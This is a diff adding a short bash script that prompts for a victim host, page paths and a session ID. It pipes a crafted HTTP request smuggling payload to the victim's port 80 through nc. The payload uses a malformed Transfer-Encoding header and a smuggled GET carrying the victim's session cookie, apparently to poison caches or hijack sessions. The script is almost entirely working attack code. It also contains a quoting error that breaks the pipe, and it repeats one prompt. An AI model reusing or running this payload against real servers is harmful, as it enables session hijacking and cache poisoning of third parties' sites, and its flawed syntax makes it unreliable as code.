@@ -1,0 +1,21 @@
+#!/bin/bash
+echo -ne "[+] Enter Victim: "
+read victim
+
+echo -ne "[+] Enter Path: "
+read pagepath
+
+echo -ne "[+] Enter Path: "
+read javapath
+
+echo -ne "[+] Enter Session: "
+read session
+
+echo "POST / HTTP/1.1
+Transfer-Encoding: blah
+
+0
+
+GET /$pagepath HTTP/1.1
+X: X GET /$javapath.js HTTP/1.1
+Cookie: sessionid = $session"; | nc $victim 80
